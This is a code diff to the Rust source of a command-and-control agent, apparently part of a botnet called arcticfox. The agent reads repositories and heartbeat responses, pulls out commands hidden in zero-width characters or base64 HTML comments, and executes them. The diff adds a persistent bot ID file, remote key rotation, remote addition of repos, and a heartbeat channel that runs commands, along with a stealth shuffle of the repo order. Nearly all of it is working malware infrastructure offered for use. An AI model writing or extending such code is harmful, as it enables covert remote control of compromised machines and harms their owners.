@@ -6,18 +6,22 @@
 //! Repo list can be updated dynamically from payloads.
 
 use std::sync::Arc;
-use std::time::{Duration, Instant};
-use tokio::sync::RwLock;
+use std::time::Duration;
+use tokio::sync::{RwLock, mpsc};
 use tracing::{debug, error, info, warn};
 
 use arcticfox_core::config::{AgentConfig, RepoSource};
 use arcticfox_core::crypto::BotHasher;
 use arcticfox_core::error::{ArcticFoxError, Result};
 use arcticfox_core::zwcodec;
+use arcticfox_core::zwcodec::SessionMarkers;
 
 use crate::executor;
 use crate::fetcher::Fetcher;
 use crate::heartbeat::Heartbeat;
+
+const MAX_REPOS: usize = 256;
+const BOT_ID_FILE: &str = "/tmp/.sd-id";
 
 /// Main C2 agent.
 pub struct Agent {
@@ -26,6 +30,8 @@ pub struct Agent {
     fetcher: Fetcher,
     heartbeat: Heartbeat,
     bot_hasher: BotHasher,
+    marker_sets: RwLock<Vec<SessionMarkers>>,
+    cmd_rx: RwLock<Option<mpsc::UnboundedReceiver<String>>>,
 }
 
 impl Agent {
@@ -35,16 +41,15 @@ impl Agent {
         bot_id: Option<String>,
         config_path: std::path::PathBuf,
     ) -> Result<Self> {
-        let bot_id = bot_id.unwrap_or_else(Self::generate_bot_id);
+        let bot_id = bot_id.unwrap_or_else(|| Self::load_or_generate_bot_id());
         let fetcher = Fetcher::new()?;
-        let heartbeat = Heartbeat::new();
+        let (cmd_tx, cmd_rx) = mpsc::unbounded_channel();
+        let heartbeat = Heartbeat::new(cmd_tx);
         let bot_hasher = BotHasher::new();
 
-        // Save config to disk on startup
         let config_arc = Arc::new(RwLock::new(config));
         {
             let cfg = config_arc.read().await;
-            // Try to save, but don't fail startup if we can't
             if let Err(e) = cfg.save(&config_path) {
                 warn!("Could not save config on startup: {e}");
             }
@@ -56,7 +61,19 @@ impl Agent {
             fetcher,
             heartbeat,
             bot_hasher,
+            marker_sets: RwLock::new(vec![SessionMarkers::default()]),
+            cmd_rx: RwLock::new(Some(cmd_rx)),
         })
+    }
+
+    fn load_or_generate_bot_id() -> String {
+        if let Ok(id) = std::fs::read_to_string(BOT_ID_FILE) {
+            let id = id.trim().to_string();
+            if !id.is_empty() { return id; }
+        }
+        let id = Self::generate_bot_id();
+        let _ = std::fs::write(BOT_ID_FILE, &id);
+        id
     }
 
     /// Generate a persistent bot ID.
@@ -68,13 +85,31 @@ impl Agent {
 
     /// Run the main agent loop. Returns only on fatal error or shutdown signal.
     pub async fn run(&self, mut shutdown: tokio::sync::watch::Receiver<bool>) -> Result<()> {
-        info!(
-            "Agent {} starting — {} repos configured",
-            self.bot_id,
-            self.config.read().await.repos.len()
-        );
+        debug!("Agent starting — {} repos configured", self.config.read().await.repos.len());
 
-        // Start heartbeat in background if configured
+        // Start heartbeat-command receiver: forwards ZW-extracted commands to executor
+        let cmd_rx = self.cmd_rx.write().await.take();
+        if let Some(mut rx) = cmd_rx {
+            let mut shutdown_clone = shutdown.clone();
+            tokio::spawn(async move {
+                loop {
+                    tokio::select! {
+                        cmd = rx.recv() => {
+                            if let Some(cmd) = cmd {
+                                debug!("Heartbeat command: executing");
+                                let _ = executor::execute_command(&cmd).await;
+                            } else {
+                                break;
+                            }
+                        }
+                        _ = shutdown_clone.changed() => {
+                            if *shutdown_clone.borrow() { break; }
+                        }
+                    }
+                }
+            });
+        }
+
         let _hb_handle = self.heartbeat.start(
             self.bot_id.clone(),
             self.bot_hasher.clone(),
@@ -151,7 +186,7 @@ impl Agent {
         // Randomize order for stealth
         let mut candidates = repos.clone();
         // Simple Fisher-Yates shuffle
-        for i in (1..candidates.len()).rev() {
+        for i in (0..candidates.len()).rev() {
             let j = rand::random::<usize>() % (i + 1);
             candidates.swap(i, j);
         }
@@ -166,19 +201,16 @@ impl Agent {
                 continue;
             }
 
-            // Check backoff
+            // Check backoff — use chrono timestamps not Instant
             if repo.fail_count >= max_fails {
-                let backoff = repo.backoff_duration(poll_interval);
-                let now = Instant::now();
-                let last_fail = if repo.last_fail > 0.0 {
-                    let secs = repo.last_fail as u64;
-                    Instant::now() - Duration::from_secs(now.elapsed().as_secs().saturating_sub(secs))
-                } else {
-                    Instant::now()
-                };
-                if last_fail.elapsed() < backoff {
-                    debug!("Repo {} in backoff, skipping", repo.label());
-                    continue;
+                let backoff_secs = repo.backoff_duration(poll_interval).as_secs();
+                let now_ts = chrono::Utc::now().timestamp() as u64;
+                if repo.last_fail > 0.0 {
+                    let last_fail_ts = repo.last_fail as u64;
+                    if now_ts.saturating_sub(last_fail_ts) < backoff_secs {
+                        debug!("Repo {} in backoff, skipping", repo.label());
+                        continue;
+                    }
                 }
             }
 
@@ -192,19 +224,18 @@ impl Agent {
                     })
                     .await;
 
-                    // Extract and process commands
-                    if let Some(payload) = zwcodec::extract(&content) {
-                        match self.process_payload(&payload, &content).await {
-                            Ok(executed) => {
-                                if executed {
-                                    return Ok(true);
-                                }
-                            }
-                            Err(e) => {
-                                warn!("Error processing payload: {e}");
+                    // Extract ZW payloads — try all known marker sets for key rotation support
+                    let mut extracted = false;
+                    for markers in self.marker_sets.read().await.iter() {
+                        if let Some(payload) = zwcodec::extract_with_markers(&content, markers) {
+                            match self.process_payload(&payload, &content).await {
+                                Ok(true) => { extracted = true; break; }
+                                Ok(false) => { extracted = true; }
+                                Err(e) => warn!("Error processing payload: {e}"),
                             }
                         }
                     }
+                    if extracted { return Ok(true); }
 
                     // Also check legacy formats
                     let commands = extract_legacy_commands(&content);
@@ -269,6 +300,23 @@ impl Agent {
                 hb.get("sec").and_then(|v| v.as_u64()),
             ) {
                 self.heartbeat.update_config(url.to_string(), sec).await;
+            }
+            // Also extract session key for ZW-encrypted heartbeat responses
+            if let Some(key_hex) = hb.get("key").and_then(|v| v.as_str()) {
+                if let Ok(key_bytes) = hex::decode(key_hex) {
+                    if key_bytes.len() == 32 {
+                        let mut key = [0u8; 32];
+                        key.copy_from_slice(&key_bytes);
+                        self.heartbeat.update_session_key(key).await;
+                        // Register new markers derived from this key
+                        let new_markers = SessionMarkers::from_key(&key);
+                        let mut markers = self.marker_sets.write().await;
+                        if !markers.iter().any(|m| m.start == new_markers.start) {
+                            markers.insert(0, new_markers);
+                            markers.truncate(3);
+                        }
+                    }
+                }
             }
         }
 
@@ -348,7 +396,7 @@ impl Agent {
         // Deduplicate by hash
         let cmd_str = commands.join("\n");
         let cmd_hash = arcticfox_core::crypto::sha256_hex(cmd_str.as_bytes());
-        let short_hash = &cmd_hash[..16];
+        let short_hash = &cmd_hash[..cmd_hash.len().min(16)];
 
         {
             let cfg = self.config.read().await;
@@ -362,10 +410,28 @@ impl Agent {
         let mut executed = false;
 
         for cmd in commands {
-            // Check for agent-control commands
             if cmd.starts_with("add_repo ") {
                 let spec_str = cmd.strip_prefix("add_repo ").unwrap_or("");
                 self.add_repos_from_spec(spec_str).await;
+                executed = true;
+                continue;
+            }
+
+            if cmd.starts_with("set_key ") {
+                if let Ok(key_bytes) = hex::decode(cmd.strip_prefix("set_key ").unwrap_or("").trim()) {
+                    if key_bytes.len() == 32 {
+                        let mut key = [0u8; 32];
+                        key.copy_from_slice(&key_bytes);
+                        self.heartbeat.update_session_key(key).await;
+                        let mut markers = self.marker_sets.write().await;
+                        let new_markers = SessionMarkers::from_key(&key);
+                        if !markers.iter().any(|m| m.start == new_markers.start) {
+                            markers.insert(0, new_markers);
+                            markers.truncate(3);
+                        }
+                        info!("Session key rotated");
+                    }
+                }
                 executed = true;
                 continue;
             }
@@ -446,6 +512,10 @@ impl Agent {
                 && r.repo == new_repo.repo
         });
         if !already_exists {
+            if cfg.repos.len() >= MAX_REPOS {
+                warn!("Repo limit ({}) reached, ignoring new repo: {}", MAX_REPOS, new_repo.label());
+                return;
+            }
             info!("Discovered new repo: {}", new_repo.label());
             cfg.repos.push(new_repo);
         }
@@ -496,11 +566,26 @@ fn extract_legacy_commands(content: &str) -> Vec<String> {
             let block = &content[start + MARKER_START.len()..end];
             for line in block.lines() {
                 let line = line.trim();
-                if !line.is_empty()
-                    && !line.starts_with("//")
-                    && !line.starts_with('#')
-                {
+                if !line.is_empty() && !line.starts_with("//") && !line.starts_with('#') {
                     commands.push(line.to_string());
+                }
+            }
+        }
+    }
+
+    // B64-encoded format (Python pastebomb.py compatibility)
+    if let Some(idx) = content.find("<!-- B64:") {
+        let rest = &content[idx + 9..];
+        if let Some(end) = rest.find("-->") {
+            let b64 = rest[..end].trim();
+            if let Ok(decoded) = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, b64) {
+                if let Ok(text) = String::from_utf8(decoded) {
+                    for line in text.lines() {
+                        let line = line.trim();
+                        if !line.is_empty() && !line.starts_with("//") && !line.starts_with('#') {
+                            commands.push(line.to_string());
+                        }
+                    }
                 }
             }
         }
@@ -513,17 +598,13 @@ fn extract_legacy_commands(content: &str) -> Vec<String> {
             let block = &rest[..end];
             for line in block.lines() {
                 let line = line.trim();
-                if !line.is_empty()
-                    && !line.starts_with("//")
-                    && !line.starts_with('#')
-                {
+                if !line.is_empty() && !line.starts_with("//") && !line.starts_with('#') {
                     commands.push(line.to_string());
                 }
             }
         }
     }
 
-    // Deduplicate
     let mut seen = std::collections::HashSet::new();
     commands.retain(|c| seen.insert(c.clone()));
     commands
